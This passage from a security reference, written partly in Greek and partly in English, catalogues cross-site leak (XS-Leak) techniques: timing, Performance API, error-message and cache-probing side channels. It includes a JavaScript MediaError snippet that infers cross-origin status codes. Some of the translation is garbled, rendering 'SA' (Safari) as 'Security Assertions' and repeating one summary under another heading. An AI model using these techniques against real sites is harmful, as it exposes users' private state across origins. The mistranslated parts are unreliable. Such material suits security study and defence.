* **Summary:** Μια μέθοδος για να μετρήσετε τον χρόνο εκτέλεσης μιας διαδικασίας ιστού περιλαμβάνει σκόπιμα το μπλοκάρισμα του event loop ενός νήματος και στη συνέχεια το χρονισμό **πόσο χρόνο χρειάζεται για να γίνει διαθέσιμο ξανά το event loop**. Εισάγοντας μια μπλοκαρισμένη λειτουργία (όπως μια μακρά υπολογιστική διαδικασία ή μια συγχρονισμένη κλήση API) στο event loop και παρακολουθώντας τον χρόνο που χρειάζεται για να αρχίσει η εκτέλεση του επόμενου κώδικα, μπορεί κανείς να συμπεράνει τη διάρκεια των εργασιών που εκτελούνταν στο event loop κατά τη διάρκεια της μπλοκαρισμένης περιόδου. Αυτή η τεχνική εκμεταλλεύεται τη μονόνημη φύση του event loop της JavaScript, όπου οι εργασίες εκτελούνται διαδοχικά, και μπορεί να παρέχει πληροφορίες σχετικά με την απόδοση ή τη συμπεριφορά άλλων λειτουργιών που μοιράζονται το ίδιο νήμα.
* **Code Example**:

Ένα σημαντικό πλεονέκτημα της τεχνικής μέτρησης του χρόνου εκτέλεσης κλειδώνοντας το event loop είναι η δυνατότητά της να παρακάμψει **Site Isolation**. **Site Isolation** είναι ένα χαρακτηριστικό ασφαλείας που χωρίζει διαφορετικές ιστοσελίδες σε ξεχωριστές διαδικασίες, με στόχο να αποτρέψει κακόβουλες ιστοσελίδες από το να έχουν άμεση πρόσβαση σε ευαίσθητα δεδομένα από άλλες ιστοσελίδες. Ωστόσο, επηρεάζοντας τον χρονισμό εκτέλεσης μιας άλλης προέλευσης μέσω του κοινόχρηστου event loop, ένας επιτιθέμενος μπορεί έμμεσα να εξάγει πληροφορίες σχετικά με τις δραστηριότητες αυτής της προέλευσης. Αυτή η μέθοδος δεν βασίζεται σε άμεση πρόσβαση στα δεδομένα της άλλης προέλευσης, αλλά παρατηρεί την επίδραση των δραστηριοτήτων αυτής της προέλευσης στο κοινόχρηστο event loop, αποφεύγοντας έτσι τα προστατευτικά εμπόδια που έχουν καθοριστεί από το **Site Isolation**.

{% hint style="warning" %}
Σε έναν χρονισμό εκτέλεσης είναι δυνατόν να **εξαλείψετε** **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν τη φορτώσετε.
{% endhint %}

### Connection Pool

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** Ένας επιτιθέμενος θα μπορούσε να κλειδώσει όλες τις υποδοχές εκτός από 1, να φορτώσει την στοχευμένη ιστοσελίδα και ταυτόχρονα να φορτώσει μια άλλη σελίδα, ο χρόνος μέχρι να αρχίσει να φορτώνει η τελευταία σελίδα είναι ο χρόνος που χρειάστηκε η στοχευμένη σελίδα για να φορτωθεί.
* **Code Example**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

Οι περιηγητές χρησιμοποιούν υποδοχές για την επικοινωνία με τον διακομιστή, αλλά λόγω των περιορισμένων πόρων του λειτουργικού συστήματος και του υλικού, **οι περιηγητές αναγκάζονται να επιβάλουν ένα όριο** στον αριθμό των ταυτόχρονων υποδοχών. Οι επιτιθέμενοι μπορούν να εκμεταλλευτούν αυτόν τον περιορισμό μέσω των εξής βημάτων:

1. Προσδιορίστε το όριο υποδοχών του περιηγητή, για παράδειγμα, 256 παγκόσμιες υποδοχές.
2. Καταλάβετε 255 υποδοχές για παρατεταμένη διάρκεια ξεκινώντας 255 αιτήματα σε διάφορους διακομιστές, σχεδιασμένα να κρατούν τις συνδέσεις ανοιχτές χωρίς να ολοκληρώνονται.
3. Χρησιμοποιήστε την 256η υποδοχή για να στείλετε ένα αίτημα στη στοχευμένη σελίδα.
4. Προσπαθήστε να κάνετε ένα 257ο αίτημα σε διαφορετικό διακομιστή. Δεδομένου ότι όλες οι υποδοχές είναι σε χρήση (όπως αναφέρεται στα βήματα 2 και 3), αυτό το αίτημα θα είναι σε αναμονή μέχρι να γίνει διαθέσιμη μια υποδοχή. Η καθυστέρηση πριν προχωρήσει αυτό το αίτημα παρέχει στον επιτιθέμενο πληροφορίες χρονισμού σχετικά με τη δικτυακή δραστηριότητα που σχετίζεται με την υποδοχή της 256ης (την υποδοχή της στοχευμένης σελίδας). Αυτή η συμπερασματική είναι δυνατή επειδή οι 255 υποδοχές από το βήμα 2 είναι ακόμα απασχολημένες, υποδηλώνοντας ότι οποιαδήποτε νέα διαθέσιμη υποδοχή πρέπει να είναι αυτή που απελευθερώθηκε από το βήμα 3. Ο χρόνος που χρειάζεται για να γίνει διαθέσιμη η 256η υποδοχή συνδέεται άμεσα με τον χρόνο που απαιτείται για να ολοκληρωθεί το αίτημα στη στοχευμένη σελίδα.

Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
* **More info**:
* **Summary:** Είναι σαν την προηγούμενη τεχνική αλλά αντί να χρησιμοποιεί όλες τις υποδοχές, το Google **Chrome** θέτει ένα όριο **6 ταυτόχρονων αιτημάτων στην ίδια προέλευση**. Αν **μπλοκάρουμε 5** και στη συνέχεια **εκκινήσουμε ένα 6ο** αίτημα μπορούμε να **χρονίσουμε** το και αν καταφέρουμε να κάνουμε τη **σελίδα του θύματος να στείλει** περισσότερα **αιτήματα** στο ίδιο endpoint για να ανιχνεύσουμε μια **κατάσταση** της **σελίδας**, το **6ο αίτημα** θα διαρκέσει **περισσότερο** και μπορούμε να το ανιχνεύσουμε.

## Performance API Techniques

Το [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) προσφέρει πληροφορίες σχετικά με τις μετρικές απόδοσης των διαδικτυακών εφαρμογών, εμπλουτισμένο περαιτέρω από το [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). Το Resource Timing API επιτρέπει την παρακολούθηση λεπτομερών χρονισμών αιτημάτων δικτύου, όπως η διάρκεια των αιτημάτων. Σημαντικά, όταν οι διακομιστές περιλαμβάνουν την επικεφαλίδα `Timing-Allow-Origin: *` στις απαντήσεις τους, επιπλέον δεδομένα όπως το μέγεθος μεταφοράς και ο χρόνος αναζήτησης τομέα γίνονται διαθέσιμα.

Αυτή η πλούσια συλλογή δεδομένων μπορεί να ανακτηθεί μέσω μεθόδων όπως [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ή [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), παρέχοντας μια ολοκληρωμένη εικόνα των πληροφοριών που σχετίζονται με την απόδοση. Επιπλέον, το API διευκολύνει τη μέτρηση των χρόνων εκτέλεσης υπολογίζοντας τη διαφορά μεταξύ των χρονικών σημείων που αποκτώνται από [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Ωστόσο, αξίζει να σημειωθεί ότι για ορισμένες λειτουργίες σε περιηγητές όπως το Chrome, η ακρίβεια του `performance.now()` μπορεί να περιορίζεται σε χιλιοστά του δευτερολέπτου, γεγονός που μπορεί να επηρεάσει την λεπτομέρεια των μετρήσεων χρονισμού.

Πέρα από τις μετρήσεις χρονισμού, το Performance API μπορεί να αξιοποιηθεί για πληροφορίες που σχετίζονται με την ασφάλεια. Για παράδειγμα, η παρουσία ή η απουσία σελίδων στο αντικείμενο `performance` στο Chrome μπορεί να υποδηλώνει την εφαρμογή του `X-Frame-Options`. Συγκεκριμένα, αν μια σελίδα αποκλείεται από την απόδοση σε ένα πλαίσιο λόγω του `X-Frame-Options`, δεν θα καταγραφεί στο αντικείμενο `performance`, παρέχοντας μια λεπτή ένδειξη σχετικά με τις πολιτικές πλαισίωσης της σελίδας.

### Error Leak

* **Inclusion Methods**: Frames, HTML Elements
* **Detectable Difference**: Κωδικός Κατάστασης
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Ένα αίτημα που έχει ως αποτέλεσμα σφάλματα δεν θα δημιουργήσει μια είσοδο χρονισμού πόρου.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Είναι δυνατόν να **διακρίνετε μεταξύ των κωδικών κατάστασης HTTP** επειδή τα αιτήματα που οδηγούν σε **σφάλμα** δεν **δημιουργούν μια είσοδο απόδοσης**.

### Style Reload Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Κωδικός Κατάστασης
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Λόγω ενός σφάλματος του περιηγητή, τα αιτήματα που έχουν ως αποτέλεσμα σφάλματα φορτώνονται δύο φορές.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Στην προηγούμενη τεχνική εντοπίστηκαν επίσης δύο περιπτώσεις όπου σφάλματα του περιηγητή στο GC οδηγούν σε **πόρους που φορτώνονται δύο φορές όταν αποτυγχάνουν να φορτωθούν**. Αυτό θα έχει ως αποτέλεσμα πολλές εισόδους στο Performance API και μπορεί έτσι να ανιχνευθεί.

### Request Merging Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Κωδικός Κατάστασης
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Τα αιτήματα που έχουν ως αποτέλεσμα σφάλμα δεν μπορούν να συγχωνευθούν.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Η τεχνική βρέθηκε σε έναν πίνακα στο αναφερόμενο έγγραφο αλλά δεν βρέθηκε περιγραφή της τεχνικής σε αυτό. Ωστόσο, μπορείτε να βρείτε τον πηγαίο κώδικα ελέγχοντας το [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Οι κενές απαντήσεις δεν δημιουργούν εισόδους χρονισμού πόρων.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Ένας επιτιθέμενος μπορεί να ανιχνεύσει αν ένα αίτημα είχε ως αποτέλεσμα ένα κενό σώμα HTTP επειδή οι **κενές σελίδες δεν δημιουργούν μια είσοδο απόδοσης σε ορισμένους περιηγητές**.

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Χρησιμοποιώντας τον XSS Auditor στις Ασφαλιστικές Δηλώσεις, οι επιτιθέμενοι μπορούν να ανιχνεύσουν συγκεκριμένα στοιχεία ιστοσελίδας παρατηρώντας τις αλλαγές στις απαντήσεις όταν οι κατασκευασμένες payloads ενεργοποιούν τον μηχανισμό φιλτραρίσματος του auditor.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Στις Ασφαλιστικές Δηλώσεις (SA), ο XSS Auditor, αρχικά προορισμένος να αποτρέπει επιθέσεις Cross-Site Scripting (XSS), μπορεί παραδόξως να εκμεταλλευτεί για να διαρρεύσει ευαίσθητες πληροφορίες. Αν και αυτό το ενσωματωμένο χαρακτηριστικό αφαιρέθηκε από το Google Chrome (GC), εξακολουθεί να είναι παρόν στο SA. Το 2013, οι Braun και Heiderich απέδειξαν ότι ο XSS Auditor θα μπορούσε ακούσια να αποκλείσει νόμιμα σενάρια, οδηγώντας σε ψευδώς θετικά. Βασισμένοι σε αυτό, οι ερευνητές ανέπτυξαν τεχνικές για την εξαγωγή πληροφοριών και την ανίχνευση συγκεκριμένου περιεχομένου σε σελίδες από άλλες προελεύσεις, μια έννοια γνωστή ως XS-Leaks, που αναφέρθηκε αρχικά από τον Terada και αναλύθηκε από τον Heyes σε μια ανάρτηση blog. Αν και αυτές οι τεχνικές ήταν συγκεκριμένες για τον XSS Auditor στο GC, ανακαλύφθηκε ότι στο SA, οι σελίδες που αποκλείονται από τον XSS Auditor δεν δημιουργούν εισόδους στο Performance API, αποκαλύπτοντας μια μέθοδο μέσω της οποίας μπορεί να διαρρεύσει ευαίσθητες πληροφορίες.

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Επικεφαλίδα
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** Πόρος με επικεφαλίδα X-Frame-Options δεν δημιουργεί είσοδο χρονισμού πόρου.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Αν μια σελίδα **δεν επιτρέπεται** να **αποδοθεί** σε ένα **iframe** δεν δημιουργεί **είσοδο απόδοσης**. Ως αποτέλεσμα, ένας επιτιθέμενος μπορεί να ανιχνεύσει την επικεφαλίδα απάντησης **`X-Frame-Options`**.\
Το ίδιο συμβαίνει αν χρησιμοποιήσετε μια **embed** **ετικέτα.**

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: Επικεφαλίδα
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Οι λήψεις δεν δημιουργούν εισόδους χρονισμού πόρων στο Performance API.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Παρόμοια με την XS-Leak που περιγράφηκε, ένας **πόρος που κατεβάζεται** λόγω της επικεφαλίδας ContentDisposition, επίσης δεν **δημιουργεί είσοδο απόδοσης**. Αυτή η τεχνική λειτουργεί σε όλους τους κύριους περιηγητές.

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Ανακατεύθυνση
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Η είσοδος χρονισμού πόρου διαρρέει τον χρόνο έναρξης μιας ανακατεύθυνσης.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Βρήκαμε μια περίπτωση XS-Leak που εκμεταλλεύεται τη συμπεριφορά ορισμένων περιηγητών που καταγράφουν υπερβολικές πληροφορίες για διασυνοριακά αιτήματα. Το πρότυπο ορίζει ένα υποσύνολο χαρακτηριστικών που πρέπει να οριστούν σε μηδέν για διασυνοριακούς πόρους. Ωστόσο, στο **SA** είναι δυνατόν να ανιχνευθεί αν ο χρήστης **ανακατευθύνεται** από τη στοχευμένη σελίδα, ερωτώντας το **Performance API** και ελέγχοντας τα δεδομένα χρονισμού **redirectStart**.

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Ανακατεύθυνση
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Η διάρκεια των εισόδων χρονισμού είναι αρνητική όταν συμβαίνει μια ανακατεύθυνση.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Στο GC, η **διάρκεια** για αιτήματα που έχουν ως αποτέλεσμα μια **ανακατεύθυνση** είναι **αρνητική** και μπορεί έτσι να **διακριθεί** από αιτήματα που δεν έχουν ως αποτέλεσμα ανακατεύθυνση.

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Επικεφαλίδα
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Πόρος προστατευμένος με CORP δεν δημιουργεί εισόδους χρονισμού πόρων.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Σε ορισμένες περιπτώσεις, η **είσοδος nextHopProtocol** μπορεί να χρησιμοποιηθεί ως τεχνική διαρροής. Στο GC, όταν η **επικεφαλίδα CORP** είναι ρυθμισμένη, το nextHopProtocol θα είναι **κενό**. Σημειώστε ότι το SA δεν θα δημιουργήσει καθόλου είσοδο απόδοσης για πόρους που έχουν ενεργοποιηθεί με CORP.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: Χρήση API
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** Ανίχνευση αν ένας service worker είναι καταχωρημένος για μια συγκεκριμένη προέλευση.
* **Code Example**:

Οι service workers είναι σενάρια που εκτελούνται σε ένα προορισμό. Εκτελούνται στο παρασκήνιο μιας ιστοσελίδας και μπορούν να παρεμβαίνουν, να τροποποιούν και να **κάνουν cache πόρους** για να δημιουργήσουν διαδικτυακές εφαρμογές εκτός σύνδεσης.\
Αν ένας **πόρος που έχει γίνει cache** από έναν **service worker** προσπελαστεί μέσω **iframe**, ο πόρος θα **φορτωθεί από την cache του service worker**.\
Για να ανιχνεύσετε αν ο πόρος **φορτώθηκε από την cache του service worker**, μπορεί να χρησιμοποιηθεί το **Performance API**.\
Αυτό θα μπορούσε επίσης να γίνει με μια επίθεση χρονισμού (ελέγξτε το έγγραφο για περισσότερες πληροφορίες).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Χρονισμός
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** Είναι δυνατόν να ελέγξετε αν ένας πόρος αποθηκεύτηκε στην cache.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Χρησιμοποιώντας το [Performance API](./#performance-api) είναι δυνατόν να ελέγξετε αν ένας πόρος είναι cached.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** Είναι δυνατόν να ανακτηθεί η διάρκεια δικτύου ενός αιτήματος από το `performance` API.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML Elements (Video, Audio)
* **Detectable Difference**: Κωδικός Κατάστασης
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** Στο Firefox είναι δυνατόν να διαρρεύσει με ακρίβεια τον κωδικό κατάστασης ενός διασυνοριακού αιτήματος.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` interface's message property uniquely identifies resources that load successfully with a distinct string. An attacker can exploit this feature by observing the message content, thereby deducing the response status of a cross-origin resource.

### CORS Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** Στις Δηλώσεις Ασφαλείας (SA), τα μηνύματα σφάλματος CORS εκθέτουν ακούσια το πλήρες URL των ανακατευθύνσεων.
* **Code Example**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

This technique enables an attacker to **extract the destination of a cross-origin site's redirect** by exploiting how Webkit-based browsers handle CORS requests. Specifically, when a **CORS-enabled request** is sent to a target site that issues a redirect based on user state and the browser subsequently denies the request, the **full URL of the redirect's target** is disclosed within the error message. This vulnerability not only reveals the fact of the redirect but also exposes the redirect's endpoint and any **sensitive query parameters** it may contain.

### SRI Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** Στις Δηλώσεις Ασφαλείας (SA), τα μηνύματα σφάλματος CORS εκθέτουν ακούσια το πλήρες URL των ανακατευθύνσεων.
* **Code Example**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

An attacker can exploit **verbose error messages** to deduce the size of cross-origin responses. This is possible due to the mechanism of Subresource Integrity (SRI), which uses the integrity attribute to validate that resources fetched, often from CDNs, haven't been tampered with. For SRI to work on cross-origin resources, these must be **CORS-enabled**; otherwise, they're not subject to integrity checks. In Security Assertions (SA), much like the CORS error XS-Leak, an error message can be captured after a fetch request with an integrity attribute fails. Attackers can deliberately **trigger this error** by assigning a **bogus hash value** to the integrity attribute of any request. In SA, the resulting error message inadvertently reveals the content length of the requested resource. This information leakage allows an attacker to discern variations in response size, paving the way for sophisticated XS-Leak attacks.

### CSP Violation/Detection

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Summary:** Επιτρέποντας μόνο την ιστοσελίδα των θυμάτων στο CSP, αν προσπαθήσουμε να ανακατευθύνουμε σε διαφορετικό τομέα, το CSP θα ενεργοποιήσει ένα ανιχνεύσιμο σφάλμα.
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

A XS-Leak can use the CSP to detect if a cross-origin site was redirected to a different origin. This leak can detect the redirect, but additionally, the domain of the redirect target leaks. The basic idea of this attack is to **allow the target domain on the attacker site**. Once a request is issued to the target domain, it **redirects** to a cross-origin domain. **CSP blocks** the access to it and creates a **violation report used as a leak technique**. Depending on the browser, **this report may leak the target location of the redirect**.\
Modern browsers won't indicate the URL it was redirected to, but you can still detect that a cross-origin redirect was triggered.

### Cache

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Summary:** Καθαρίστε το αρχείο από την κρυφή μνήμη. Ανοίγει τη στοχευμένη σελίδα και ελέγχει αν το αρχείο είναι παρόν στην κρυφή μνήμη.
* **Code Example:**

Browsers might use one shared cache for all websites. Regardless of their origin, it is possible to deduct whether a target page has **requested a specific file**.

If a page loads an image only if the user is logged in, you can **invalidate** the **resource** (so it's no longer cached if it was, see more info links), **perform a request** that could load that resource and try to load the resource **with a bad request** (e.g. using an overlong referer header). If the resource load **didn't trigger any error**, it's because it was **cached**.

### CSP Directive

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Summary:** Οι κατευθυντήριες γραμμές κεφαλίδας CSP μπορούν να ερευνηθούν χρησιμοποιώντας την ιδιότητα iframe CSP, αποκαλύπτοντας λεπτομέρειες πολιτικής.
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

A novel feature in Google Chrome (GC) allows web pages to **propose a Content Security Policy (CSP)** by setting an attribute on an iframe element, with policy directives transmitted along with the HTTP request. Normally, the embedded content must **authorize this via an HTTP header**, or an **error page is displayed**. However, if the iframe is already governed by a CSP and the newly proposed policy isn't more restrictive, the page will load normally. This mechanism opens a pathway for an attacker to **detect specific CSP directives** of a cross-origin page by identifying the error page. Although this vulnerability was marked as fixed, our findings reveal a **new leak technique** capable of detecting the error page, suggesting that the underlying problem was never fully addressed.

### **CORP**

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Summary:** Οι πόροι που είναι ασφαλισμένοι με την Πολιτική Πόρων Διαφορετικών Προελεύσεων (CORP) θα ρίξουν ένα σφάλμα όταν ανακτηθούν από μια μη επιτρεπόμενη προέλευση.
* **Code Example**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

The CORP header is a relatively new web platform security feature that when set b**locks no-cors cross-origin requests to the given resource**. The presence of the header can be detected, because a resource protected with CORP will **throw an error when fetched**.

### CORB

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Summary**: Το CORB μπορεί να επιτρέψει στους επιτιθέμενους να ανιχνεύσουν πότε η **κεφαλίδα `nosniff` είναι παρούσα** στην αίτηση.
* **Code Example**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Check the link for more information about the attack.

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Summary**: Αν η κεφαλίδα Origin ανακλάται στην κεφαλίδα `Access-Control-Allow-Origin`, είναι δυνατόν να ελέγξουμε αν ένας πόρος είναι ήδη στην κρυφή μνήμη.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

In case the **Origin header** is being **reflected** in the header `Access-Control-Allow-Origin` an attacker can abuse this behaviour to try to **fetch** the **resource** in **CORS** mode. If an **error** **isn't** triggered, it means that it was **correctly retrieved form the web**, if an error is **triggered**, it's because it was **accessed from the cache** (the error appears because the cache saves a response with a CORS header allowing the original domain and not the attackers domain)**.**\
Note that if the origin isn't reflected but a wildcard is used (`Access-Control-Allow-Origin: *`) this won't work.

## Readable Attributes Technique

### Fetch Redirect

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Status Code
* **More info**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Summary:** GC και SA επιτρέπουν να ελέγξουμε τον τύπο της απάντησης (opaque-redirect) αφού ολοκληρωθεί η ανακατεύθυνση.
